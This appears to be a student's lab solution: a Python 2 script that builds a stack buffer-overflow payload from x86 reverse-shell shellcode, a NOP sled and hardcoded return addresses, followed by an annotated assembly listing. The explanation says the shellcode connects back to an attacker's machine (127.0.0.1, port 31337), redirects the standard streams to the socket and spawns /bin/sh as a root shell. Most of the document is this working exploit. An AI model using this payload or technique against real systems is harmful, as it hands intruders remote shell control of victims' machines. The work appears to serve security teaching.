shellcode =("\xba\xf4\xf1\xfe\xbf\x88\x02\x42\x88\x02\x31\xc0\x31\xdb\x31\xc9\x51\xb1\x06\x51\xb1\x01\x51\xb1\x02\x51\x89\xe1\xb3\x01\xb0\x66\xcd\x80\x89\xc2\x31\xc0\x31\xc9\x51\x51\x68\x7f\x01\x01\x01\x66\x68\x7a\x69\xb1\x02\x66\x51\x89\xe7\xb3\x10\x53\x57\x52\x89\xe1\xb3\x03\xb0\x66\xcd\x80\x31\xc9\x39\xc1\x74\x06\x31\xc0\xb0\x01\xcd\x80\x31\xc0\xb0\x3f\x89\xd3\xcd\x80\x31\xc0\xb0\x3f\x89\xd3\xb1\x01\xcd\x80\x31\xc0\xb0\x3f\x89\xd3\xb1\x02\xcd\x80\x31\xc0\x31\xd2\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80")
#0xbffef1f4
strfill = ""
for i in range(0,2025-(len(shellcode)-23)):
	strfill = strfill + chr(0x90)
# addr of my shellcode : 0xbffef1c8, addr of where ret addr is located : 0xbffef1c8 + 2056, bffef9d0
pa = ("\xc8\xf1\xfe\xbf\xdc\xf9\xfe\xbf")
print shellcode + strfill + pa


"""

solution:
basically, what this shellcode is doing is calling the system functions to connect attacker's machine and redirect the socket's input and output 
to the standard input and standard output stream, which then is received and executed by the rootshell opened by the shellcode. Therefore, the victim is able to perform whatever commands that are sent to it and send the output back to attacker's machine.

I was going to use netcat -e to do this trick, but it turns out that the netcat in the VM has disabled all the insecure flags like -e and -c.

Here is the x86 Assembly Code

 		xorl    %eax,   %eax

						since we can not pass in 0x0 as an argument, I set the ip address parameter as "abcd", so here I modified it to the actual ip, which is "127.0.0.1"

		mov    $0xaaaaaaaa,%edx
		mov    %al,(%edx)
		inc    %edx
		mov    %al,(%edx)

		initialize socket stuff
                xorl    %ebx,   %ebx
                xorl    %ecx,   %ecx
                pushl   %ecx
                movb    $6,     %cl             # using tcp protocol
                pushl   %ecx
                movb    $1,     %cl
                pushl   %ecx
                movb    $2,     %cl             # use AF_INET
                pushl   %ecx
                movl    %esp,   %ecx
                movb    $1,     %bl             # SYS_SOCKET
                movb    $102,   %al             # call SYS_socketcall
                int     $0x80

                				connect to the attack machine
                movl    %eax,   %edx
                xorl    %eax,   %eax
                xorl    %ecx,   %ecx
                pushl   %ecx
                pushl   %ecx
						ip address
                pushl   $0x44434241
		port
                pushw   $07a69
                movb    $0x02,  %cl
                pushw   %cx
                movl    %esp,   %edi
                movb    $16,    %bl
                pushl   %ebx
                pushl   %edi
                pushl   %edx
                movl    %esp,   %ecx
                movb    $3,     %bl
						systemcall sys_socketcall
                movb    $102,   %al             
                int     $0x80           
                xorl    %ecx,   %ecx
                cmpl    %eax,   %ecx
						if not connected successfully, exit
                je successfull
		
                # exit()
                xorl    %eax,   %eax
                movb    $1,     %al
                int     $0x80

                successfull:
                				bind the socket to standard input stream
                xorl    %eax,   %eax
                movb    $63,    %al
                movl    %edx,   %ebx
                int     $0x80

               				        bind the socket to standard output stream
                xorl    %eax,   %eax
                movb    $63,    %al
                movl    %edx,   %ebx
                movb    $1,     %cl
                int     $0x80

                				bind the socket to standard error stream
                xorl    %eax,   %eax
                movb    $63,    %al
                movl    %edx,   %ebx
                movb    $2,     %cl
                int     $0x80

                				execute a shell
                xorl    %eax,   %eax
                xorl    %edx,   %edx
                pushl   %eax
                pushl   $0x68732f6e
		/bin/sh
                pushl   $0x69622f2f
                movl    %esp,   %ebx
                pushl   %eax
                pushl   %ebx
                movl    %esp,   %ecx
		call sys_execve
                movb    $11,    %al
                int     $0x80
		exit 
                xorl    %eax,   %eax
                movb    $1,     %al
                int     $0x80
"""
